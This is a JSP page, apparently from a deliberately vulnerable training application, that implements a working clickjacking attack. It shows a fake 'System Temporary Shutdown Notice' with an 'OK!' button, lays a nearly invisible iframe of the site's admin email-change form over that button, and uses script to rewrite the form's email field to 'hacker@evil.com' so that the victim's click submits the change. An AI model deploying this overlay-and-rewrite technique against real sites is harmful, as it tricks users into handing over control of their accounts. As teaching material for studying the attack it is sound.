<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt" %>

<fmt:setLocale value="${pageContext.request.locale}" />
<fmt:setBundle basename="messages" />

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="ja">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="referrer" content="unsafe-url" />
    <title>System Temporary Shutdown Notice</title>
    <link rel="icon" type="image/vnd.microsoft.icon" href="/images/favicon.ico" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" integrity="sha384-OHBBOqpYHNsIqQy8hL1U+8OXf9hH6QRxi0+EODezv82DfnZoV7qoHAZDwMwEJvSw" crossorigin="anonymous" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha384-3ceskX3iaEnIogmQchP8opvBy3Mi7Ce34nWjpBIwVTHfGYWQS9jwHDVRnpKKHJg7" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
    <script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js" integrity="sha384-3+mjTIH6k3li4tycpEniAI83863YpLyJGB/hdI15inFZcAQK3IeMdXSgnoPkTzHn" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script>
    <style>
      /* Attack target iframe is completely transparent and overlaid */
      #hijacked_frame {
      position: absolute;
      top: 200px;
      left: 50px;
      width: 1000px;
      height: 1000px;
      opacity: 0.0001; /* Close to completely transparent, but still accepts clicks */
      z-index: 1000; /* Placed at the very front */
      border: none;
      }
      /* Style for the fake button shown to the user */
      #fake_button {
      position: absolute;
      top: 405px;
      left: 70px;
      z-index: 1; /* Placed below the iframe */
      padding: 5px;
      background-color: #EEEEEE;
      border: 1px solid;
      #color: white;
      font-size: 14px;
      cursor: pointer;
      pointer-events: none; /* Disable click events on the fake button to pass clicks to the iframe */
      }
    </style>
  </head>
  <body style="margin-left: 20px; margin-right: 20px;">
    <table style="width: 100%;">
      <tr>
        <td>
          <h2><span class="glyphicon glyphicon-globe"></span> <span><fmt:message key="click.jacking.page.title" /></span></h2>
        </td>
        <td align="right">
          <p>Login user ID: admin</p>
          <a href="http://<%=request.getServerName()%>/logout">Logout</a>
        </td>
      </tr>
    </table>
    <hr style="margin-top: 0px" />
    <p><fmt:message key="click.jacking.page.message1" /><br/>
      <img src="../img/system_suspention.png" width="228" height="228" border="0"><br/>
      <fmt:message key="click.jacking.page.message2" />
    </p>
    <div id="fake_button">
      OK!
    </div>
    <iframe id="hijacked_frame"
      src="http://<%=request.getServerName()%>/admins/clickjacking"
      scrolling="no">
    </iframe>
    <script>
      // Logic added to automatically rewrite the form values after the iframe loads,
      // and precisely align the iframe's button over the submit button
      document.getElementById('hijacked_frame').onload = function() {
          var iframeDoc = document.getElementById('hijacked_frame').contentWindow.document;

          // Core of the attack code: Forcefully rewrite the email address input field in the form
          var mailInput = iframeDoc.querySelector('input[name="mail"]');
          if (mailInput) {
              mailInput.value = "hacker@evil.com";
          }

          // When the user clicks the fake button, the submit button of this transparent form is clicked
          // The attacker adjusts the top/left of #fake_button to align with the Submit button using CSS
      };
    </script>
  </body>
</html>